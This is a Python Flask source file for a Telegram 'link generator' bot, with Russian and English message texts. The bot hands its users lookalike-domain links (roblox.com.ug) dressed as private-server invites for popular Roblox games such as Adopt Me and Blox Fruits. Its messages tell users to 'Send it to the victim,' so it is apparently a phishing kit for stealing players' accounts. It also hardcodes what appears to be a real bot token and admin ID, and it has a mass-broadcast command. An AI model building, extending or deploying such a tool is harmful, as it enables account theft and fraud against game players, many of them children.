from flask import Flask, request
import requests
import os
import json
import re

app = Flask(__name__)

# ===== НАСТРОЙКИ (ЗАМЕНИ НА СВОИ) =====
BOT_TOKEN = "8851655567:AAEGziVSFXpZSAMD1hSjreZhP-OBfQUjvoc"
ADMIN_CHAT_ID = "8625787020"
# =======================================

# === ФАЙЛЫ ДЛЯ ХРАНЕНИЯ ===
USERS_FILE = "users.json"
LANG_FILE = "lang.json"

def load_json(file):
    if os.path.exists(file):
        with open(file, "r") as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f)

# Загружаем список пользователей
if os.path.exists(USERS_FILE):
    with open(USERS_FILE, "r") as f:
        USERS = json.load(f)
else:
    USERS = []

def save_user(user_id):
    if user_id not in USERS:
        USERS.append(user_id)
        with open(USERS_FILE, "w") as f:
            json.dump(USERS, f)

# Загружаем языки
user_lang = load_json(LANG_FILE)
def save_lang():
    save_json(LANG_FILE, user_lang)

# Глобальная переменная для ответов админа
pending_reply = {}

# === ТЕКСТЫ ===
TEXTS = {
    "ru": {
        "welcome": "🔓 *LINK GENERATOR*\n\n▸ Выберите игру и получите готовую ссылку.\n▸ Нажмите на кнопку ниже.",
        "choose_action": "📌 *Выберите игру:*",
        "game_list": (
            "🎮 *Доступные игры:*\n"
            "─────────────────\n"
            "▸ Adopt Me\n"
            "▸ Murder Mystery 2\n"
            "▸ Blox Fruits\n"
            "▸ Brookhaven RP\n"
            "▸ Pet Simulator 99\n"
            "▸ Toilet Tower Defense\n"
            "▸ RIVALS\n"
            "▸ Grow a Garden 2\n"
            "▸ Steal a Brainrot\n"
            "▸ +1 Speed Keyboard Escape"
        ),
        "link_sent": "🔗 *Ссылка для {}:*\n\n{}\n\n📌 *Отправьте её жертве.*",
        "support": "✍️ *Напишите ваш запрос. Администратор ответит в ближайшее время.*",
        "choose_lang": "🌐 *Выберите язык:*",
        "lang_changed": "✅ *Язык изменён.*",
        "reply_sent": "✅ *Ответ отправлен*",
        "admin_reply": "📨 *Ответ администратора:*\n",
        "no_user": "⚠️ *Зажми сообщение с ID пользователя → Ответить*",
        "unknown_game": "⚠️ *Игра не найдена. Выберите из списка.*"
    },
    "en": {
        "welcome": "🔓 *LINK GENERATOR*\n\n▸ Choose a game and get a ready link.\n▸ Press the button below.",
        "choose_action": "📌 *Choose a game:*",
        "game_list": (
            "🎮 *Available games:*\n"
            "─────────────────\n"
            "▸ Adopt Me\n"
            "▸ Murder Mystery 2\n"
            "▸ Blox Fruits\n"
            "▸ Brookhaven RP\n"
            "▸ Pet Simulator 99\n"
            "▸ Toilet Tower Defense\n"
            "▸ RIVALS\n"
            "▸ Grow a Garden 2\n"
            "▸ Steal a Brainrot\n"
            "▸ +1 Speed Keyboard Escape"
        ),
        "link_sent": "🔗 *Link for {}:*\n\n{}\n\n📌 *Send it to the victim.*",
        "support": "✍️ *Write your request. Admin will reply soon.*",
        "choose_lang": "🌐 *Choose language:*",
        "lang_changed": "✅ *Language changed.*",
        "reply_sent": "✅ *Reply sent*",
        "admin_reply": "📨 *Admin reply:*\n",
        "no_user": "⚠️ *Long press message with user ID → Reply*",
        "unknown_game": "⚠️ *Game not found. Choose from the list.*"
    }
}

# === ССЫЛКИ ПО ИГРАМ ===
GAME_LINKS = {
    "adopt me": "https://roblox.com.ug/games/920587237/Adopt-Me?privateServerLinkCode=09950661995727700947160135244713",
    "murder mystery 2": "https://roblox.com.ug/games/142823291/Murder-Mystery-2?privateServerLinkCode=09950661995727700947160135244713",
    "blox fruits": "https://roblox.com.ug/games/2753915549/Blox-Fruits?privateServerLinkCode=09950661995727700947160135244713",
    "brookhaven rp": "https://roblox.com.ug/games/4924922222/Brookhaven-RP?privateServerLinkCode=09950661995727700947160135244713",
    "pet simulator 99": "https://roblox.com.ug/games/8737899170/WORLD-CUP-Pet-Simulator-99?privateServerLinkCode=09950661995727700947160135244713",
    "toilet tower defense": "https://roblox.com.ug/games/13775256536/LEGACY-Toilet-Tower-Defense?privateServerLinkCode=09950661995727700947160135244713",
    "rivals": "https://roblox.com.ug/games/17625359962/RIVALS?privateServerLinkCode=09950661995727700947160135244713",
    "grow a garden 2": "https://roblox.com.ug/games/97598239454123/Grow-a-Garden-2?privateServerLinkCode=09950661995727700947160135244713",
    "steal a brainrot": "https://roblox.com.ug/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=09950661995727700947160135244713",
    "+1 speed keyboard escape": "https://roblox.com.ug/games/95082159892680/1-Speed-Keyboard-Escape-Candy-Chocolate?privateServerLinkCode=09950661995727700947160135244713"
}

# === КЛАВИАТУРЫ ===
LANG_KEYBOARD = {
    "keyboard": [
        ["🇷🇺 Русский", "🇬🇧 English"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": True
}

MAIN_KEYBOARD_RU = {
    "keyboard": [
        ["🔗 Создать ссылку"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

MAIN_KEYBOARD_EN = {
    "keyboard": [
        ["🔗 Generate link"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

GAME_KEYBOARD_RU = {
    "keyboard": [
        ["Adopt Me", "Murder Mystery 2"],
        ["Blox Fruits", "Brookhaven RP"],
        ["Pet Simulator 99", "Toilet Tower Defense"],
        ["RIVALS", "Grow a Garden 2"],
        ["Steal a Brainrot", "+1 Speed Keyboard Escape"],
        ["🔙 Назад"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

GAME_KEYBOARD_EN = {
    "keyboard": [
        ["Adopt Me", "Murder Mystery 2"],
        ["Blox Fruits", "Brookhaven RP"],
        ["Pet Simulator 99", "Toilet Tower Defense"],
        ["RIVALS", "Grow a Garden 2"],
        ["Steal a Brainrot", "+1 Speed Keyboard Escape"],
        ["🔙 Back"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

BACK_KEYBOARD_RU = {
    "keyboard": [
        ["🔙 Назад"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": True
}

BACK_KEYBOARD_EN = {
    "keyboard": [
        ["🔙 Back"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": True
}

@app.route('/')
def home():
    return "Bot is alive!", 200

@app.route('/webhook', methods=['POST'])
def webhook():
    global pending_reply
    data = request.get_json()
    
    if data and 'message' in data:
        chat_id = data['message']['chat']['id']
        text = data['message'].get('text', '')
        username = data['message']['from'].get('username', 'anon')
        user_id = data['message']['from']['id']

        # === АДМИН ===
        if str(chat_id) == ADMIN_CHAT_ID:
            reply_to = data['message'].get('reply_to_message')
            if reply_to:
                if pending_reply.get("user_id"):
                    target_id = pending_reply["user_id"]
                    target_lang = user_lang.get(str(target_id), "ru")
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": target_id,
                            "text": TEXTS[target_lang]["admin_reply"] + text,
                            "parse_mode": "Markdown"
                        }
                    )
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": ADMIN_CHAT_ID,
                            "text": f"✅ *Ответ отправлен* @{pending_reply.get('username', 'anon')}",
                            "parse_mode": "Markdown"
                        }
                    )
                    pending_reply = {}
                    return "ok", 200
                else:
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": ADMIN_CHAT_ID,
                            "text": "⚠️ *Не удалось найти пользователя для ответа.*",
                            "parse_mode": "Markdown"
                        }
                    )
                    return "ok", 200

            if text.startswith("/reply "):
                parts = text.split(" ", 2)
                if len(parts) >= 3 and parts[1].isdigit():
                    target_id = int(parts[1])
                    reply_text = parts[2]
                    target_lang = user_lang.get(str(target_id), "ru")
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": target_id,
                            "text": TEXTS[target_lang]["admin_reply"] + reply_text,
                            "parse_mode": "Markdown"
                        }
                    )
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": ADMIN_CHAT_ID,
                            "text": f"✅ *Ответ отправлен* (ID: {target_id})",
                            "parse_mode": "Markdown"
                        }
                    )
                    return "ok", 200
                else:
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": ADMIN_CHAT_ID,
                            "text": "⚠️ *Используй:* `/reply ID Текст`",
                            "parse_mode": "Markdown"
                        }
                    )
                    return "ok", 200

            if text and not text.startswith("/"):
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": TEXTS["ru"]["no_user"],
                        "parse_mode": "Markdown"
                    }
                )
                return "ok", 200

            if text == '/start':
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": "👋 *Привет, админ!*\n\n▸ Бот работает\n▸ Зажми сообщение → Ответить\n▸ Используй /help",
                        "parse_mode": "Markdown",
                        "reply_markup": MAIN_KEYBOARD_RU
                    }
                )
                return "ok", 200

            if text == '/help':
                help_text = (
                    "📋 *Команды:*\n\n"
                    "/help — помощь\n"
                    "/users — количество пользователей\n"
                    "/reply ID Текст — ответить\n"
                    "/sendall Текст — рассылка\n\n"
                    "📌 *Зажми сообщение → Ответить*"
                )
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": help_text,
                        "parse_mode": "Markdown"
                    }
                )
                return "ok", 200

            if text == '/users':
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": f"👥 *Всего пользователей:* {len(USERS)}",
                        "parse_mode": "Markdown"
                    }
                )
                return "ok", 200

            if text.startswith("/sendall "):
                msg = text.replace("/sendall ", "")
                for uid in USERS:
                    try:
                        requests.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={"chat_id": uid, "text": msg}
                        )
                    except:
                        pass
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": f"✅ *Рассылка отправлена* {len(USERS)} пользователям.",
                        "parse_mode": "Markdown"
                    }
                )
                return "ok", 200

            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": ADMIN_CHAT_ID,
                    "text": TEXTS["ru"]["no_user"],
                    "parse_mode": "Markdown"
                }
            )
            return "ok", 200

        # === ПОЛЬЗОВАТЕЛЬ ===
        save_user(user_id)
        lang = user_lang.get(str(user_id), "ru")
        t = TEXTS[lang]

        # Смена языка
        if text in ["🌐 Сменить язык", "🌐 Change language"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["choose_lang"],
                    "reply_markup": LANG_KEYBOARD
                }
            )
            return "ok", 200

        if text == "🇷🇺 Русский":
            user_lang[str(user_id)] = "ru"
            save_lang()
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": TEXTS["ru"]["lang_changed"],
                    "parse_mode": "Markdown",
                    "reply_markup": MAIN_KEYBOARD_RU
                }
            )
            return "ok", 200

        if text == "🇬🇧 English":
            user_lang[str(user_id)] = "en"
            save_lang()
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": TEXTS["en"]["lang_changed"],
                    "parse_mode": "Markdown",
                    "reply_markup": MAIN_KEYBOARD_EN
                }
            )
            return "ok", 200

        # === ОТПРАВКА СООБЩЕНИЙ АДМИНУ ===
        pending_reply = {"user_id": user_id, "username": username}

        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": ADMIN_CHAT_ID,
                "text": f"@{username}",
                "parse_mode": "Markdown"
            }
        )

        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": ADMIN_CHAT_ID,
                "text": text,
                "parse_mode": "Markdown"
            }
        )

        # === ОБРАБОТКА КНОПОК ===
        keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU
        game_keyboard = GAME_KEYBOARD_EN if lang == "en" else GAME_KEYBOARD_RU
        back_keyboard = BACK_KEYBOARD_EN if lang == "en" else BACK_KEYBOARD_RU

        if text in ["🔗 Создать ссылку", "🔗 Generate link"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["game_list"],
                    "parse_mode": "Markdown",
                    "reply_markup": game_keyboard
                }
            )

        elif text in ["🔙 Назад", "🔙 Back"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["choose_action"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        elif text.lower() in GAME_LINKS:
            game_name = text.lower()
            link = GAME_LINKS[game_name]
            # Красивое название для вывода
            display_name = text.title() if lang == "en" else text
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["link_sent"].format(display_name, link),
                    "parse_mode": "Markdown",
                    "reply_markup": game_keyboard
                }
            )

        elif text == '/start':
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["welcome"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        else:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["choose_action"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

    return "ok", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
